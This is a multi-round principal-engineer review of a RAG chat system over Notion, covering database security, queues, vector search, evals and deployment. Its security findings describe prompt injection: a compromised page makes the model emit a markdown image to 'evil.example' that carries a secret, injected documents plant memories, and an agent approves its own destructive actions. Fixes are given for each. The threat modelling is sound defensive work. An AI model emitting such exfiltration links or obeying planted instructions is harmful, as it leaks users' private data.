# Principal Engineer Review — RAGForge design v0.1

Reviewer stance: principal engineer at a large company, reviewing a design that a Senior/Staff candidate will defend in interviews and that must actually run on a laptop.

Scope: everything proposed so far: DESIGN.md v0.1, the tech stack, the users and use cases, the Outbox + Redpanda proposal, and the Notion HLD.

Verdict: **Request changes.** The ideas are solid, but the design is over-built for its real load, and it contains a few factual errors that would surface the moment someone runs it on a Mac.

---

## Scorecard

| Area | Score | One-line verdict |
|---|---|---|
| Problem framing / users | **5/10** | Users were added late and stayed generic. The real first user is *you* with *your Notion*, and the design didn't optimize for that. |
| Architecture (HLD) | **7/10** | The connector abstraction and the single service layer are good. Too many boxes for the load. |
| Data model | **7.5/10** | RLS, content hashes and generated tsvector are good. Misses the fact that LangGraph tables have no `tenant_id`. |
| RAG design | **7/10** | Hybrid + RRF + rerank is right. Calling an LLM for doc grading on a 3B CPU model is a latency trap. |
| Agent design | **6.5/10** | The graph is reasonable, but nobody set a latency budget. It could take 4–6 sequential LLM calls per question. |
| Messaging (Outbox + Redpanda) | **4/10** | A solution looking for a problem. The consumers were invented to justify the broker. |
| Infra / clone-and-run | **5.5/10** | 10+ containers and ~6GB of downloads. Ollama in Docker on macOS gets **no GPU**. |
| Project structure | **6/10** | One package means every image ships every dependency (torch, streamlit, loaders) and no layering is enforced. |
| Deployment (Helm) | **6.5/10** | The pre-upgrade migration hook is right. It leans on Bitnami subcharts (catalog changed in 2025) and HPA on a custom metric with no adapter named. |
| Testability / evals | **7.5/10** | testcontainers plus an eval gate in CI is a strong signal. |
| Interview defensibility | **6/10** | A good interviewer would ask "why Kafka?", "why Redis?", "what's p95 chat latency?", and v0.1 has no good answers. |
| **Overall** | **6.2/10** | **Revised target after the changes below: 8.5/10** |

---

## Findings (most severe first)

### P0: wrong or would break on a laptop

1. **Ollama in Docker on macOS is CPU-only.** Docker Desktop doesn't pass Apple's Metal GPU through to containers. A 3B model then generates ~5–10 tok/s, and with 4–6 LLM calls per question, one chat answer takes 30–60s. The demo would feel broken.
   **Fix:** prefer a **host Ollama** (the native app uses Metal) when one is reachable at `host.docker.internal:11434`. Fall back to the containerized Ollama only when it isn't. `make up` detects which one to use.

2. **Notion webhooks can't reach a laptop.** Notion needs a public HTTPS endpoint to deliver them. v0.1 said syncs happen "within seconds" through webhooks, which isn't true locally.
   **Fix:** **polling with the `last_edited_time` cursor is the primary path.** Webhooks are an optional accelerator when deployed, or locally through a tunnel such as `cloudflared`. Polling stays as the safety net either way.

3. **Two Postgres drivers.** The LangGraph Postgres checkpointer and store use **psycopg 3**, while v0.1 picked asyncpg for SQLAlchemy. That means two connection pools and two sets of type handling.
   **Fix:** standardize on **psycopg 3** (async) for both SQLAlchemy and LangGraph.

4. **RLS doesn't cover LangGraph tables.** The checkpoint and store tables are owned by the library and have no `tenant_id`, so "tenant isolation enforced by the database" was overstated.
   **Fix:** state it honestly. Isolation there comes from the `conversations` table, which *is* under RLS. The API resolves `thread_id` only through `conversations`, so a client can never pass a raw `thread_id`. Store namespaces start with `tenant_id`. Add a test for both.

### P1: over-engineering that hurts delivery and has no payoff

5. **Outbox + Redpanda (see the dedicated analysis below).** Rejected for v1. Keep the seam, don't pay for the infrastructure.

6. **Redis has no real job in v1.**
   - The *semantic cache* is actively risky for RAG: answers go stale after a Notion edit, and a missing tenant-key check would leak data across tenants.
   - Rate limiting for one user can wait.

   **Fix:** drop Redis from v1. Re-introduce it with a named need, such as shared rate limits once there are multiple API replicas.

7. **The reranker pulls in PyTorch.** `sentence-transformers` + `bge-reranker` adds about 2GB to the image and slow cold starts.
   **Fix:** use an ONNX cross-encoder (FlashRank or `bge-reranker` exported to ONNX) behind a `Reranker` port. The image stays small and it's still CPU-fast.

8. **The LLM grades documents.** Calling an LLM per retrieval to grade relevance duplicates what the reranker already gives you.
   **Fix:** `grade_docs` uses a **reranker score threshold**, with no LLM call. Spend the LLM budget on generation plus one grounding check. Target at most **2 LLM calls** on the happy path.

9. **API gold-plating.** Idempotency-Key headers, cursor pagination everywhere, and an HPA on a custom metric don't pay for themselves at personal scale.
   **Fix:** keep `problem+json` and SSE. Defer idempotency keys, since uploads are already idempotent by content hash. If you autoscale the worker, use **KEDA's PostgreSQL scaler**, which reads queue depth with one SQL query and needs no custom metrics adapter.

10. **Observability is three separate stacks** (Collector + Jaeger + Prometheus + Grafana).
    **Fix:** one `grafana/otel-lgtm` container in an `obs` profile bundles the OTel collector, Tempo, Prometheus, Loki and Grafana. The app code stays the same.

### P2: design-quality gaps

11. **There's no latency or cost budget.** Without numbers, nobody can call any design choice right or wrong.
    **Fix:** add SLOs:
    - chat p95 < 8s with host Ollama, or < 4s with OpenAI.
    - query (retrieval only) p95 < 400ms.
    - incremental Notion sync freshness < 10 min.

12. **MCP calls the service layer directly.** That duplicates auth, tenancy and rate-limit enforcement in a second entry point, and opens a second DB pool.
    **Fix:** the MCP server is a **thin client of the public API**. The extra network hop costs about 1ms, and in return there's one choke point for authorization.

13. **The users section came last.** Personas must drive scope. Primary persona: *you* (and later your team) asking questions over **your Notion**. That means the **Notion connector moves to M2**, ahead of generic file upload.

14. **Bitnami subcharts.** Bitnami restructured its free container catalog in 2025, so depending on its charts is fragile.
    **Fix:** use the managed service in cloud. For kind, use a small first-party StatefulSet for Postgres with pgvector, or the CloudNativePG operator.

15. **Notion initial sync cost was ignored.** At ~3 req/s, a 1,000-page workspace with nested blocks is about 5k calls, or roughly 30 min on first sync.
    **Fix:** show progress per page, make the sync resumable (cursor saved per page), and prioritize recently edited pages first.

### What v0.1 got right (keep)
- Postgres as the single source of truth: pgvector + FTS + `SKIP LOCKED` job queue. One database means one transaction and one backup.
- Inserting the document and its job in the same transaction. That already *is* the transactional-outbox guarantee.
- The connector `Protocol`, idempotency via `(source, page, block)` + content hash, and tombstone reconciliation.
- Migrations as a separate one-shot step and a Helm pre-upgrade hook, never at app boot.
- Eval regression gate in CI.
- The decisions table showing rejected alternatives. Extended into ADRs in v0.2.

---

## Dedicated analysis: Transactional Outbox + Redpanda

### What it would give us
| Pro | Real for us? |
|---|---|
| Atomic "state change + event" with no dual write | **Already achieved.** The job row is inserted in the same transaction as the document. |
| Fan-out to many independent consumers | **No.** The three consumers proposed were all weak (see below). |
| Replay / event history | **No need in v1.** Any doc can be re-synced from Notion. |
| Decoupling across team or service boundaries | **No.** There's one codebase and one team. |
| Throughput beyond Postgres | **No.** Load is tens to hundreds of docs a day. |
| Kafka on your résumé | **Yes**, but only if you can defend *why* it's there. |

### Why each proposed consumer is weak
- **cache-invalidator:** only exists because of the semantic cache, which we're dropping (P1-6).
- **webhook-notifier:** no tenant app subscribes to anything. The UI already gets job status over SSE.
- **usage-analytics:** this is a `GROUP BY` over `usage_events`, written inline.

### Costs
- About 1GB+ RAM for the Redpanda container, plus a relay process. That makes clone-and-run slower and adds failure modes.
- At-least-once delivery means every consumer must be idempotent. You also take on ordering per partition key, poison-message DLQ topics, schema evolution, and consumer-lag monitoring.
- More moving parts to debug for zero user-visible benefit.

### Decision → ADR-0003
- **v1: no external broker.** Define an `EventPublisher` port. The only adapter is **Postgres**: an `outbox_events` table written in the same transaction, and a dispatcher that claims rows with `SKIP LOCKED`, woken by `LISTEN/NOTIFY` so latency stays low without busy polling.
- **Add the Redpanda adapter only when a trigger is met:**
  1. a consumer outside this deployable appears (an analytics pipeline, another service), or
  2. you need replay or multiple consumers with independent progress, or
  3. sustained event rate exceeds about 500/s.

  The first plausible real consumer is a **"docs changed today" Slack digest plus an automatic eval re-run when the corpus changes**. That's a stretch milestone.
- **Interview line:** "I built the outbox seam, and Kafka is a one-adapter change. I didn't deploy it because none of the three trigger conditions are met yet, and here's the cost I avoided."

---

## Self-assessment of the reviewer's earlier answers

| Earlier answer | Grade | Honest note |
|---|---|---|
| 6 project ideas | B+ | Good spread. #3 (LLM gateway) was arguably the stronger Staff signal, and it's still a good later add-on. |
| DESIGN v0.1 | B− | Broad and well-organized, but scope-first rather than user-first. Contained the P0 errors above. |
| Users / use cases | B | Plausible, but invented a support-portal persona nobody has. |
| Messaging-queue answer | B+ | The Postgres-queue reasoning was right. Then it proposed the broker anyway without stating trigger conditions. |
| Notion HLD | B | A good connector contract. Wrong about local webhooks, and the diagram was hard to read. |

All P0 and P1 items are resolved in **DESIGN.md v0.2** and **docs/adr/**.

---
---

# Round 2: review of v0.2 (stricter bar: "would I approve this for a tier-1 production launch?")

Reviewer stance: 25 years building search, storage and distributed systems. Round 1 fixed what was *wrong*. This round looks for what's **missing, subtly incorrect, or would fail at month three**.

**v0.2 score under this bar: 7.4/10.** Better structured, but there are real correctness holes in retrieval, queueing, streaming and evals.

## Scorecard (v0.2 → v0.3)

| Area | v0.2 | v0.3 | What moved it |
|---|---|---|---|
| Problem framing / tenancy model | 7 | 9.5 | Explicit tenancy model; documented that the Notion API exposes no page ACLs, so team mode is "shared-integration visibility" with a consent warning; ACL hook for sources that do expose ACLs |
| Retrieval correctness | 6.5 | 9.5 | nomic task prefixes, contextual chunk headers, filtered-HNSW iterative scans, candidate budgets, near-duplicate collapse |
| Notion ingestion fidelity | 6 | 9.5 | Per-block-type normalization (synced blocks, tables, toggles, child pages, DB rows), link graph, content-addressed embeddings |
| Data model | 7.5 | 9.5 | `NULLS NOT DISTINCT`, embedding spaces (zero-downtime model change), DB roles that make RLS + workers + KEDA actually work, audit log |
| Job system | 7 | 9.5 | Leases + heartbeat, priorities, per-tenant fairness, bloat control, LISTEN/NOTIFY pooling caveat |
| Agent / streaming | 6.5 | 9.5 | Fixed the "stream first, verify after" contradiction; deterministic citation check; JSON-schema structured output; versioned prompts |
| Security / privacy | 7 | 9.5 | Markdown exfiltration defense, telemetry content redaction, least-privilege Notion capabilities, parser sandboxing, supply chain |
| Evals | 6 | 9.5 | Public synthetic corpus for CI (private Notion data never leaves your machine), statistically valid gate (paired bootstrap), judge metrics report-only |
| Operability | 7 | 9.5 | Data classification → backups only for authoritative data; expand/contract migrations; `CONCURRENTLY` index builds; `/readyz` checks schema head; graceful shutdown; multi-arch |
| DX / clone-and-run | 7.5 | 9.5 | `make doctor`, no host port collisions, demo works without Notion |
| **Overall (design)** | **7.4** | **9.4** | See the honesty note at the end |

## Findings on v0.2 (most severe first)

### P0: correctness and security

1. **Team mode would leak private pages.** The Notion API has **no endpoint for page-level permissions**. Everything shared with the integration becomes visible to every user in the tenant, so a teammate could retrieve pages they can't open in Notion.
   → Tenancy model (ADR-0013):
   - **v1 tenant = one person.** Team tenants are allowed only with an explicit "everything shared with this integration is visible to all members" consent at connect time.
   - A `document_acl` table plus a retrieval-time ACL filter for connectors that *do* expose ACLs (Google Drive).

2. **Streaming contradicted verification.** v0.2 streamed tokens and *then* ran the grounding check, so the user had already read the unverified answer.
   → ADR-0011: stream with a `verifying` state, run a **deterministic citation check** (every cited anchor must be in the retrieved set) plus the grounding check, then emit `verification: verified | partial | unsupported`. On `unsupported`, auto-regenerate once in strict mode and send `answer.replace`. The UI shows a badge and never presents an unverified answer as final.

3. **Missing nomic-embed-text task prefixes.** The model expects `search_document: ` / `search_query: ` prefixes, and without them recall drops noticeably.
   → Prefixes are stored on the `embedding_spaces` row and applied by the `Embedder` port. A unit test asserts they're present.

4. **Filtered HNSW silently returns fewer than k results.** Tenant, collection and RLS predicates are applied *after* the index scan, so a selective filter can return 2 rows instead of 40.
   → Enable pgvector ≥ 0.8 **iterative index scans** (`SET LOCAL hnsw.iterative_scan = relaxed_order`), set `hnsw.ef_search` per query, and add a test that asserts k results under a 1% selective filter.

5. **RLS + worker + KEDA can't all work as written.** The worker claims jobs *across* tenants, and the KEDA scaler counts *all* queued jobs. Both are blocked by RLS.
   → Explicit DB roles (ADR-0013):
   - `rf_migrator` owns the schema.
   - `rf_api` has RLS enforced.
   - `rf_worker` claims through a `SECURITY DEFINER claim_jobs()` function, then does `SET LOCAL app.tenant_id` per job.
   - `rf_metrics` has read-only access to a `queue_stats` view only.

6. **Private eval data in CI.** v0.2's golden set came from *your* Notion. It can't be committed, and CI can't reach it.
   → ADR-0012: a **public synthetic corpus** (a fictional company's wiki, ~150 docs) plus ~300 reviewed Q&A pairs, committed for CI. The private golden set lives in `~/.ragforge/evals/` and runs locally only.

7. **Markdown exfiltration.** A malicious or compromised Notion page can instruct the model to output `![](https://evil.example/?q=<secret>)`, and Streamlit would render it, leaking data.
   → Output sanitizer: no remote images, and links allowed only to URLs in the cited set. Tested with an injection fixture.

### P1: would fail within months

8. **The eval gate was statistically noise.** With n=50 and recall ≈ 0.85, the standard error is about 5 points, so a "3-point regression" gate would flap randomly.
   → n ≈ 300, **paired bootstrap 95% CI** on per-question deltas. Fail only if the CI lies entirely below −2 points. LLM-judge metrics are report-only (non-deterministic, self-preference bias).

9. **No path to change the embedding model.** A fixed `vector(768)` column means any model change needs downtime and a full re-embed.
   → ADR-0009: an **embedding space** per (provider, model, dim, prefixes); embeddings in their own table; a partial HNSW expression index per space; blue/green re-embed (build → validate with evals → flip `collections.active_space_id`).

10. **Shifting chunk boundaries cause re-embed cascades.** Inserting one paragraph at the top of a page shifts every heading-based chunk, so everything gets re-embedded.
    → Embeddings are **content-addressed** by `(tenant_id, space_id, content_sha256)`. Chunks reference the hash. Synced blocks and repeated text are embedded once.

11. **Uploads could be duplicated.** `unique(collection_id, connector_id, external_id)` with `connector_id NULL` lets duplicates in, because NULLs are distinct.
    → `UNIQUE NULLS NOT DISTINCT` (PG 15+).

12. **One tenant can starve the others.** A 5k-page initial sync monopolizes the workers.
    → `claim_jobs()` uses **priority classes** (interactive > webhook > incremental > backfill) and **per-tenant concurrency caps** with round-robin.

13. **Long jobs and dead workers.** There was no lease, so a stuck job was invisible.
    → `lease_expires_at` with a heartbeat every 15 s. Expired leases are reclaimed with `attempts++`.

14. **Queue table bloat.** A high-churn table degrades over time.
    → Finished jobs move to `jobs_history` (partitioned by month); tune `fillfactor` and autovacuum on `jobs`.

15. **LISTEN/NOTIFY gotchas.** It needs a dedicated, non-pooled connection and breaks behind PgBouncer in transaction mode.
    → One dedicated listener connection per worker, polling fallback every 2 s, and a documentation note.

16. **Notion normalization was underspecified.** A per-block-type mapping is now defined: tables (header repeated per chunk), toggles (expanded), code (never split), synced blocks (resolved and deduped), child pages and DB rows (separate documents), mentions (link graph), unsupported types (skipped with a counter metric).

17. **Chunks lacked context.** "Step 3: restart it" embeds poorly on its own.
    → **Contextual chunk headers:** the page title and heading path are prepended to the embedded text, but not to the displayed text.

### P2: polish expected at this level

18. **Prompts as code.** Prompts are versioned files; `prompt_version` is recorded on usage and eval runs.
19. **Structured output.** Ollama JSON-schema `format`, Pydantic validation, one repair retry, then a safe fallback.
20. **Telemetry privacy.** Prompt and chunk text are **not** recorded in spans by default (`RAGFORGE_TRACE_CONTENT=false`).
21. **Least privilege.** The Notion integration needs **Read content** only. No insert or update capability.
22. **Untrusted parsers.** The PDF/DOCX parser runs in a subprocess with a timeout, a memory limit, and size, page and zip-ratio limits.
23. **Supply chain.**
    - Base images pinned by digest.
    - `uv.lock` committed.
    - Trivy scan and an SBOM (syft) in CI.
    - Dependabot.
24. **Operations.**
    - Data classification: authoritative data is backed up; derived data is rebuildable.
    - `pg_dump` via `make backup`.
    - Expand/contract migrations.
    - HNSW builds `CONCURRENTLY` in autocommit migrations.
    - `/readyz` fails if the Alembic revision ≠ head.
    - Graceful SIGTERM: workers finish or release their lease; SSE streams drain.
    - Multi-arch images (arm64 + amd64).
25. **DX.**
    - Postgres isn't published on host 5432 (avoids collisions with a local Postgres).
    - `make doctor` checks Docker, RAM, ports and Ollama.
    - The demo corpus works with no Notion token.
26. **Model defaults age fast.** The model is chosen through config plus an eval comparison table, not hard-coded. The default is `qwen3:8b` (thinking disabled) on ≥16 GB RAM, else `llama3.2:3b`.

## Honesty note on the 9.4

This is a **design score from the same author who wrote the design**, so self-review bias applies. Two things are required before it means anything:
1. **An independent review.** A fresh reviewer with no context of these discussions scores the docs blind (see Round 3).
2. **Evidence.** A design can't honestly go above ~9.5 until it's built and the SLO and eval tables contain *measured* numbers. The last points are earned in M3–M8, not in a document.

---
---

# Round 3: independent blind review of v0.3, and the fixes in v0.4

A fresh reviewer (no conversation context, and REVIEW.md withheld to avoid anchoring) scored **v0.3 at 5.5/10**, against the author's self-score of **9.4**. The ~4-point gap is the clearest evidence in this file that self-review isn't enough.

| Independent finding (v0.3) | Severity | Fix in v0.4 |
|---|---|---|
| FORCE RLS makes owner-owned SECURITY DEFINER functions and views see 0 rows. That breaks job claiming, the KEDA/Grafana metrics, API-key lookup, webhook routing, the scheduler, maintenance and pg_dump | P0 | `rf_system` (NOLOGIN, BYPASSRLS) owns every definer function and view; exhaustive named cross-tenant table; `rf_backup` (ADR-0013) |
| Streamed tokens get around the sanitizer, so exfiltration can happen mid-stream | P0 | Incremental server-side sanitizer state machine plus plain-text pending render; fuzz test over token boundaries (ADR-0011) |
| `/readyz == head` contradicts safe rollback | P0 | Ready unless the DB is *behind* the minimum; newer is compatible (expand/contract) |
| Helm pre-install hook runs before its Secrets exist | P1 | Secrets/ConfigMaps as lower-weight hooks; Postgres outside the release |
| NetworkPolicy blocks migrate, KEDA and Grafana | P1 | Explicit allowed sources |
| Job progress dispatched in the worker but SSE lives on API pods | P1 | API pods LISTEN on `rf_job_progress`; outbox removed entirely (ADR-0003) |
| `GET /jobs/{id}` has no read path | P1 | `rf_api` SELECT on jobs ∪ jobs_history under RLS |
| Content-hash dedupe can't work across pages (header in the hash) | P1 | Claim corrected; cross-page collapse via `display_sha256` |
| No embedding GC; hash→chunk fan-out | P1 | `gc_embeddings()`; `DISTINCT ON`; over-fetch |
| Generic plans miss the partial index; RLS blocks GIN | P1 | Search via definer functions with dynamic SQL (custom plans) and explicit tenant predicate; EXPLAIN tests after 6+ executions |
| `relaxed_order` is unsorted; `max_scan_tuples`; per-space framing | P1 | Re-sort CTE; exact path for small tenants; capacity trigger per space |
| Fairness cap racy; no fencing | P1 | Lease-version fencing in Core; advisory-lock fairness in Advanced |
| Dedupe drops webhooks; priority inversion | P1 | Dedupe on queued only, with priority upgrade on conflict |
| Minute-granular cursor; reconcile could delete live pages | P1 | Inclusive 5-min overlap; confirm with GET before tombstoning |
| Backup set incomplete | P1 | Every table classified; `rf_backup`; CI check for unclassified tables |
| Local latency optimistic; `num_ctx`; Ollama contention; no stated load | P1 | Hardware-tiered provisional SLOs measured in M4; 2k local context; explicit `num_ctx`; embedding throttle; design load stated |
| Notion capability introspection claim | P1 | Removed (guidance only); `Notion-Version` pinned |
| Stale grader reference; generated vs trigger tsvector; arithmetic | P2 | Fixed |
| Eval gate direction (non-inferiority) | P2 | Pass only if the CI lower bound ≥ −2 |
| FlashRank `max_length` | P2 | Explicit 512; top-20; measured |
| SSE cancel, concurrent turns, HITL over MCP, connector delete, Linux host Ollama | P2 | Run lifecycle, `pending_approvals`, MCP `approve`, delete cascade, `host-gateway` + `OLLAMA_HOST` |
| fillfactor claim | P2 | Removed |
| Scope: ~3–4 person-quarters | P1 | Core / Advanced / Stretch tiers; Core ships alone; 7 → 5 packages; MinIO, outbox, fairness, team tenants, KEDA, NetworkPolicies and SBOM moved out of Core |

The v0.4 score is deliberately **not self-assigned**. It comes from a second blind reviewer (Round 4).

---
---

# Round 4: second independent blind review of v0.4, and the fixes in v0.5

A second fresh reviewer scored **v0.4 at 6.3/10**, up from 5.5. Under adversarial review the defects found get deeper each round: v0.3's were mechanisms that wouldn't run at all, while v0.4's are race conditions and edge cases.

| Finding (v0.4) | Sev | Fix in v0.5 |
|---|---|---|
| Fencing doesn't cover side effects; a zombie commits stale content and cursors move backwards | P0 | `assert_lease()` row lock at the start of every result transaction; monotonic document and cursor guards (ADR-0010) |
| Dedupe key isn't tenant-scoped; Notion IDs are global, so tenant B's job merges into A's | P0 | `UNIQUE (tenant_id, dedupe_key)`; `enqueue_job` takes the tenant from the setting |
| Definer `search_path` lets temp tables shadow tables; pgvector unresolvable | P0 | `pg_catalog, rf, ext, pg_temp`; extension in `ext`; `REVOKE TEMP`; qualified operators |
| Requeue collides with the queued-only unique index | P1 | `requeue()` merges into the existing queued row (`superseded`) |
| Advisory xact locks are released at commit (fairness, conversation lock) | P1 | Conversation run lease row; fairness via a locked `tenant_queue_state` counter |
| HNSW filter can't see collection; multi-space queries unspecified | P1 | `collection_id` on embeddings; threshold per (tenant, collections, space); per-space search + RRF |
| GC / blue-green orphan races | P1 | 24 h GC grace, orphan metric + repair, dual-write to building spaces, coverage check before the flip |
| Sanitizer overflow and reference-style links | P1 | Inert escaped flush; reference definitions stripped; exact URL match; fuzz property over concatenated output |
| HITL interrupt re-runs the node → duplicate approvals | P1 | `ON CONFLICT (conversation_id, tool_call_id) DO NOTHING`; the tool runs in a separate idempotent node |
| Deleted docs come back | P1 | Authoritative `exclusions` table |
| Cursor passes dead page jobs | P1 | Nightly reconcile staleness check re-enqueues |
| Role bootstrap / BYPASSRLS on managed Postgres | P1 | Owner-based bypass (RLS enabled, not forced; NOLOGIN owner); superuser `db/init` script; no BYPASSRLS anywhere |
| Core scope unrealistic | P1 | MVP / Core / Advanced re-estimated (200–250 h / +100–150 h / +150–200 h); risk spikes first in M0 |
| `/readyz` can't order Alembic hashes | P2 | Monotonic `schema_meta` integers |
| `SET LOCAL` can't bind; empty-string handling | P2 | `set_config(..., true)` + `NULLIF` |
| Eval ratchet; τ won't transfer | P2 | Frozen-baseline floor; τ calibrated per collection on the private set |
| Ollama: keep_alive, num_ctx reloads, host env, 0.0.0.0 exposure, 16 GB tight | P2 | Fixed per request; bridge-IP bind; doctor checks; 8B at ≥ 24 GB |
| FlashRank runtime download vs read-only FS | P2 | Baked into the image |
| Injected docs can plant memories | P2 | Quote-gated `remember_fact` |
| Hosted TTFT budget has no headroom; summary races | P2 | Follow-up target 2.0 s; summary runs as a job under the conversation lease |
| Helm KEK regenerated on upgrade | P2 | Never templated; referenced Secret with `resource-policy: keep` |
| Inconsistencies (function lists, "ONE txn", hash wording, RAM vs SLO tier); priority starvation | P2 | Fixed; aging added |

The v0.5 score comes from a third blind reviewer (Round 5).

---
---

# Round 5: third independent blind review of v0.5, and the fixes in v0.6

The third fresh reviewer scored **v0.5 at 7.5/10: "solid, needs one more revision", with no P0s**. Trajectory: 5.5 → 6.3 → 7.5.

| Finding (v0.5) | Sev | Fix in v0.6 |
|---|---|---|
| Cross-class aging inverts priority during long backfills, breaking freshness | P1 | Strict class order with no cross-class aging; every-4th-claim starvation guard; per-class index-friendly queries (ADR-0010) |
| Minute-granular `≤` skip leaves same-minute edits stale; concurrent page syncs commit out of order | P1 | `fetched_at`-based freshness (`last_edited_time < date_trunc('minute', fetched_at)`); upsert guard on increasing `fetched_at`; content-sha skip |
| Non-inferiority CI gate can't pass at n=100 | P1 | Point-estimate gate + frozen floor; clustered bootstrap CI reported; 3 paraphrases per question; pinned CPU embedding container |
| Verifier never evaluated | P1 | ~150-item labeled verifier set; precision/recall SLO per model; "unverified" badge below SLO |
| Summary job holds the run lease → 409s | P1 | `conversation_summaries` with optimistic watermark; no lease; deferred during active chat; threshold-triggered; moved to Core |
| MCP agent can approve its own destructive actions | P1 | No MCP `approve` tool; `approvals:write` scope only for UI/user keys |
| `rf_backup` was a full owner | P1 | Read-only: `pg_read_all_data` + SELECT policies + `pg_dump --enable-row-security` |
| Requeue merge race | P2 | PL/pgSQL `EXCEPTION unique_violation` merge loop |
| Exclusions PK vs NULL connector; lost on connector re-add | P2 | Keyed by `(tenant_id, source_kind, external_id)` |
| Upload → collection mapping not authoritative | P2 | `uploads` table (authoritative); reindex re-ingests from blobs |
| GC race on reused embeddings | P2 | `ON CONFLICT DO UPDATE SET created_at = now()` touch |
| Exact path materialized vectors into work_mem | P2 | Index scans off inside the function; bitmap/btree filter + sort, no materialized vectors |
| No per-collection building-space link | P2 | `collections.building_space_id` |
| Checkpoint writes not fenced; message-append timing; pending approvals on a new turn; multiple interrupts | P2 | Per-node `heartbeat_run` fence; append only after `decide`; expire on new message; batched approval node with a decision map |
| LangGraph isolation not stated as app-level | P2 | Stated explicitly and tested |
| Sanitizer: code blocks > 512, bare-URL autolinks, model-supplied href | P2 | Fence state passes code unheld; bare URLs defanged unless allow-listed; canonical stored URL emitted; GFM-AST invariant tests |
| Contract-migration rule during pre-upgrade | P2 | `min_code_version` ≤ previous release's `CODE_VERSION` |
| Helm secret-referencing-secret; resource-policy no-op | P2 | `secretKeyRef` to pre-existing Secrets; KEK never templated |
| Markdown corpus bypasses Notion normalizer | P2 | Recorded Notion API JSON replayed through the real normalizer |
| Summary MVP/M5 inconsistency; queue capacity mismatch | P2 | Summary is Core (M5); capacity "hundreds of jobs/s", revisit at 500/s |
| Linux host Ollama bind fragility | P2 | Linux always uses the container profile (GPU via override), with no host port |
| MVP effort underestimated | P1 | MVP re-estimated at ~300 h (≈ 20 weeks at 15 h/wk) |

The v0.6 score comes from a fourth blind reviewer (Round 6).

---
---

# Round 6: fourth independent blind review of v0.6, and the fixes in v0.7

The fourth fresh reviewer scored **v0.6 at 7.8/10**: "approve after the P1s; not 9 yet". Trajectory: 5.5 → 6.3 → 7.5 → 7.8. Findings are now narrow edge cases inside the headline mechanisms, not structural flaws.

| Finding (v0.6) | Sev | Fix in v0.7 |
|---|---|---|
| Checkpoint writes not fenced; a zombie in its final node can overwrite history | P1 | `FencedPostgresSaver`: lease check + checkpoint write + `head_checkpoint_id` advance in one transaction; resume from the head pointer; stalled-pod test |
| GC "touch" contradicted "embed missing only" | P1 | Touch every needed hash first (`UPDATE … RETURNING`), embed the rest, upsert with touch |
| `fetched_at` clock skew / commit-time capture | P1 | Notion `Date` header at fetch start, minus 60 s |
| Notion rate limit per process, not global | P1 | Postgres `take_tokens()` bucket shared by all workers; in-flight cap per connector |
| Sanitizer fence detection looser than CommonMark | P1 | Code state only for unambiguous top-level fences; ambiguous stays text; differential grammar-based fuzzing; backtick-safe defanging |
| Point-estimate gate false-blocks ~20–26% of neutral PRs | P1 | Path-filtered significance gate (p < 0.05 and > 2 pt), false-block ≤ 5%, stated power, frozen floor, audited override |
| Starvation guard starves maintenance; overstated wait bound | P2 | Oldest-head among lower classes; wait reported as a metric |
| `set_config` index-scan setting leaks across the transaction | P2 | `search_vectors_exact` with a function-scoped `SET`; auto_explain nested plans in tests |
| Exact-path TOAST cost; absolute threshold | P2 | Threshold tuned in M3 including detoast; exact fallback until the index is valid |
| NULL tenant/dedupe; payload dropped on conflict | P2 | `SYSTEM` tenant, `NOT NULL`, payload a pure function of the key |
| Worker tenant context implicit | P2 | Explicit `set_config` per job transaction |
| Owner-owned views bypass RLS | P2 | `security_invoker = true` everywhere except `queue_stats`; lint |
| Unchanged-page handling | P2 | Bump `fetched_at`, skip chunks; no-op when the guarded upsert affects 0 rows |
| Synced-block edits don't touch embedding pages | P2 | `synced_source_ids`; reconcile checks originals |
| Weak quote gate | P2 | Stored fact **is** the quote, ≥ 20 chars |
| Verifier set too small for its SLO | P2 | ~300 items; Wilson lower bounds; false-"verified" rate headline |
| IDs change on restore; restore role | P2 | uuidv5 deterministic IDs; `pg_restore` as `rf_migrator` |
| Helm hook ConfigMap/SA; long concurrent index builds in the hook | P2 | SA as a lower-weight hook; index builds in a post-hook job |
| `content_sha256` naming collision | P2 | `page_sha256` / `embed_sha256` |
| M6 vs §10 approvals | P2 | Reworded |
| Keyword search across `fts_config`s | P2 | One tsquery per config |

The v0.7 score comes from a fifth blind reviewer (Round 7).

---
---

# Round 7: fifth independent blind review of v0.7, and the fixes in v0.8

The fifth fresh reviewer scored **v0.7 at 8.0/10: "approve after a short list of P1 fixes", with no P0s.**

| Finding (v0.7) | Sev | Fix in v0.8 |
|---|---|---|
| uuidv5 document ID collides across collections/connectors | P1 | ID tuple = uniqueness tuple `(tenant, collection, connector \| 'upload', external_id)` |
| Per-connector in-flight cap had no mechanism; head-of-line blocking | P1 | `connector_inflight` locked counter row; claim skips capped connectors |
| Approval resume vs new turn racy | P1 | Both acquire the run lease, then lock `pending_approvals` `FOR UPDATE`; stale interrupts are never resumed (contract test) |
| Fence entry wrong for list continuations; closing-fence rules | P1 | Explicit container tracking; fences only at column 0 with no open container; CommonMark close rules |
| No state channel for in-turn tool exchanges | P1 | `turn_messages` scratch channel merged at turn end |
| Post-upgrade hooks still block on long index builds | P2 | Migrate enqueues a `build_space_index` job; never a hook |
| Function list missing cross-tenant helpers | P2 | `chat_active`; internal counters listed as non-granted |
| GC touch causes HNSW churn; retired spaces never purged | P2 | `embedding_touches` side table; retired-space purge after 7 d |
| Base rate for false-"verified" not a production rate | P2 | Curve over 5–30% base rates + optional private labeling |
| Gate statistics overstated; multiplicity; path filter | P2 | Bonferroni, exact sign-test fallback, corrected power, filter includes `uv.lock` and image digests |
| `take_tokens` clock and key | P2 | `clock_timestamp()`, keyed by integration token hash |
| Naming drift; freshness bound wording | P2 | Fixed |
| `aput` override couples to internals | P2 | Pinned version + saver contract test; `head_checkpoint_id` rationale stated |
| `count()` per query | P2 | Cached `collection_space_stats` |
| RLS vs compromised credential | P2 | Threat-model note |

## Where this stands, and why I stopped iterating

| Round | Reviewer | Version | Score |
|---|---|---|---|
| 1 | self | v0.1 | (6.2 self) |
| 2 | self | v0.2 | (7.4 self) / claimed 9.4 for v0.3 |
| 3 | blind #1 | v0.3 | **5.5** |
| 4 | blind #2 | v0.4 | **6.3** |
| 5 | blind #3 | v0.5 | **7.5** |
| 6 | blind #4 | v0.6 | **7.8** |
| 7 | blind #5 | v0.7 | **8.0** |

The curve is flattening: +0.8, +1.2, +0.3, +0.2. The last two rounds found no P0s, and each found a fresh set of P1 edge cases inside mechanisms that are already sound in principle. Every reviewer also listed the same remaining items as *uncertain*, settleable only by running code:
- `hnsw.*` function-level settings;
- LangGraph interrupt and saver semantics;
